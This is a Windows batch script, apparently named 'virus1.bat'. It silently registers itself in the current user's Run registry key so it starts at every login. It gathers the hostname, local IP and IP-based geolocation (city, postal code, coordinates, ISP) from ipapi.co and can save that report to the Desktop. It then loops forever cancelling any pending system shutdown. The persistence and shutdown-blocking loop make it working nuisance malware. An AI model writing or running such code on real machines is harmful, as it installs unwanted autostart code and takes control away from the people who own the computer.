@echo off setlocal enabledelayedexpansion setlocal :: Path to this script set "scriptPath=%~f0" :: Check if already installed reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MyStartupScript >nul 2>&1 if %errorlevel% neq 0 ( echo Installing startup entry... reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^ /v MyStartupScript ^ /t REG_SZ ^ /d "\"%scriptPath%\"" ^ /f echo Installed. This script will now run on startup. ) :: ------------------------- :: Your main script starts here :: ------------------------- echo Running main script... timeout /t 2 >nul shutdown /a >nul 2>&1 echo. :: --- Timestamp --- echo [TIMESTAMP] echo Date : %DATE% echo Time : %TIME% echo. :: --- Get hostname and local IP --- echo [DEVICE INFO] for /f "tokens=*" %%H in ('hostname') do set HOSTNAME=%%H echo Hostname : %HOSTNAME% for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4"') do ( set LOCAL_IP=%%I set LOCAL_IP=!LOCAL_IP: =! goto :got_local_ip ) :got_local_ip echo Local IP : %LOCAL_IP% echo. :: --- Geolocation via ipapi.co (requires internet) --- echo [LOCATION (via IP geolocation)] :: Fetch geolocation JSON set GEO_FILE=%TEMP%\geo_report_%RANDOM%.json curl -s --max-time 10 "https://ipapi.co/json/" -o "%GEO_FILE%" 2>nul if not exist "%GEO_FILE%" ( echo Could not reach geolocation service. Check internet connection. goto :no_location ) :: Parse fields with findstr + for loops for /f "tokens=2 delims=:," %%A in ('findstr "\"ip\"" "%GEO_FILE%"') do ( set PUB_IP=%%A set PUB_IP=!PUB_IP: =! set PUB_IP=!PUB_IP:"=! ) for /f "tokens=2 delims=:," %%A in ('findstr "\"city\"" "%GEO_FILE%"') do ( set CITY=%%A set CITY=!CITY: =! set CITY=!CITY:"=! ) for /f "tokens=2 delims=:," %%A in ('findstr "\"region\"" "%GEO_FILE%"') do ( set REGION=%%A set REGION=!REGION: =! set REGION=!REGION:"=! ) for /f "tokens=2 delims=:," %%A in ('findstr "\"country_name\"" "%GEO_FILE%"') do ( set COUNTRY=%%A set COUNTRY=!COUNTRY: =! set COUNTRY=!COUNTRY:"=! ) for /f "tokens=2 delims=:," %%A in ('findstr "\"postal\"" "%GEO_FILE%"') do ( set POSTAL=%%A set POSTAL=!POSTAL: =! set POSTAL=!POSTAL:"=! ) for /f "tokens=2 delims=:," %%A in ('findstr "\"latitude\"" "%GEO_FILE%"') do ( set LAT=%%A set LAT=!LAT: =! ) for /f "tokens=2 delims=:," %%A in ('findstr "\"longitude\"" "%GEO_FILE%"') do ( set LON=%%A set LON=!LON: =! ) for /f "tokens=2 delims=:," %%A in ('findstr "\"timezone\"" "%GEO_FILE%"') do ( set TZ=%%A set TZ=!TZ: =! set TZ=!TZ:"=! ) for /f "tokens=2 delims=:," %%A in ('findstr "\"org\"" "%GEO_FILE%"') do ( set ISP=%%A set ISP=!ISP: =! set ISP=!ISP:"=! ) del "%GEO_FILE%" 2>nul echo Public IP : %PUB_IP% echo City : %CITY% echo Region : %REGION% echo Country : %COUNTRY% echo Postal : %POSTAL% echo Latitude : %LAT% echo Longitude : %LON% echo Timezone : %TZ% echo ISP / Org : %ISP% goto :done :no_location echo Location data unavailable. :done echo. echo ============================================================ :: --- Optional: save report to file --- set SAVE_FILE=%USERPROFILE%\Desktop\location_report_%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2%.txt echo Save report to Desktop? (Y/N) set /p SAVE_CHOICE="> " if /i "%SAVE_CHOICE%"=="Y" ( ( echo [TIMESTAMP] echo Date : %DATE% echo Time : %TIME% echo. echo [DEVICE INFO] echo Hostname : %HOSTNAME% echo Local IP : %LOCAL_IP% echo. echo [LOCATION] echo Public IP : %PUB_IP% echo City : %CITY% echo Region : %REGION% echo Country : %COUNTRY% echo Postal : %POSTAL% echo Latitude : %LAT% echo Longitude : %LON% echo Timezone : %TZ% echo ISP / Org : %ISP% echo. echo ) > "%SAVE_FILE%" echo Report saved to: %SAVE_FILE% ) :loop shutdown /a >nul 2>&1 timeout /t 1 /nobreak >nul goto loop pause endlocal
 virus1.bat
